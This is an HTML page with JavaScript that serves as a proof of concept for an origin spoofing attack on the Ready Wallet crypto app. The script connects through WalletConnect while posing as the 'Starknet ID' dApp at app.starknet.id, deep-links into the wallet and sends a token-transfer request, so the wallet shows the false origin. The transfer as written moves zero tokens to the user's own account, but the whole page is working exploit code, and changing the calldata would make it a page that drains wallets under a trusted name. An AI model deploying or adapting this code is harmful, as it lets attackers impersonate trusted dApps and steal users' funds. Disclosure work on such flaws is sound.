<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Ready Wallet Origin Spoof PoC</title>
</head>
<body>
  <h1>Ready Wallet Origin Spoof PoC</h1>
  <button id="connect">Connect + Spoof</button>
  <pre id="log"></pre>

  <script type="module">
    import { UniversalProvider } from 'https://esm.sh/@walletconnect/universal-provider@2.17.0';

    const REAL_ORIGIN = location.origin;
    const CLAIMED_URL = 'https://app.starknet.id';
    const CLAIMED_NAME = 'Starknet ID';

    const log = (msg) => {
      document.getElementById('log').textContent += msg + '\n';
    };

    let provider = null;
    let session = null;
    let account = null;

    document.getElementById('connect').onclick = async () => {
      try {
        log('Initializing...');

        provider = await UniversalProvider.init({
          projectId: '2f05ae7f1116030fde2d36508f472bfb',
          metadata: {
            name: CLAIMED_NAME,
            description: 'Spoofed dApp',
            url: CLAIMED_URL,
            icons: []
          },
          relayUrl: 'wss://relay.walletconnect.com'
        });

        log('Provider ready!');

        const { uri, approval } = await provider.client.connect({
          requiredNamespaces: {
            starknet: {
              chains: ['starknet:SNMAIN'],
              methods: [
                'starknet_account',
                'starknet_requestAddInvokeTransaction'
              ],
              events: ['accountsChanged']
            }
          }
        });

        if (uri) {
          log('Real origin: ' + REAL_ORIGIN);
          log('Claimed URL: ' + CLAIMED_URL);
          log('URI: ' + uri.substring(0, 60) + '...');

          // Buka Ready Wallet dengan URI
          log('Opening Ready Wallet...');
          window.location.href = 'ready://' ;
          
          await new Promise(r => setTimeout(r, 1500));
          
          // Setelah wallet terbuka, kirim URI nya
          window.location.href = `ready://wc?uri=${encodeURIComponent(uri)}`;

          log('Waiting for approval...');

          // Tunggu user approve di wallet
          session = await approval();
          log('Session approved!');

          // Ambil account
          const starknetAccounts = session?.namespaces?.starknet?.accounts;
          if (starknetAccounts?.length > 0) {
            account = starknetAccounts[0].split(':')[2];
            log('Account: ' + account);

            // Langsung coba send transaction untuk test origin spoof
            await sendTransaction();
          }
        }
      } catch(e) {
        log('Error: ' + e.message);
      }
    };

    const sendTransaction = async () => {
      if (!provider || !session || !account) {
        log('Missing provider/session/account!');
        return;
      }

      try {
        log('Opening Ready for transaction...');

        // Buka Ready Wallet dulu
        window.location.href = 'ready://';
        await new Promise(r => setTimeout(r, 1500));

        const transaction = {
          accountAddress: account,
          executionRequest: {
            calls: [
              {
                contractAddress: '0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7',
                entrypoint: 'transfer',
                calldata: [
                  account,  // to (self)
                  '0x0',    // amount low
                  '0x0'     // amount high
                ]
              }
            ]
          }
        };

        log('Sending transaction request...');

        const result = await provider.client.request({
          topic: session.topic,
          chainId: 'starknet:SNMAIN',
          request: {
            method: 'starknet_requestAddInvokeTransaction',
            params: {
              accountAddress: transaction.accountAddress,
              executionRequest: transaction.executionRequest
            }
          }
        });

        if (result?.transaction_hash) {
          log('TX Hash: ' + result.transaction_hash);
          log('Origin shown in wallet should be: ' + CLAIMED_URL);
          log('But real origin is: ' + REAL_ORIGIN);
        }
      } catch(err) {
        log('TX Error: ' + err.message);
      }
    };
  </script>
</body>
</html>
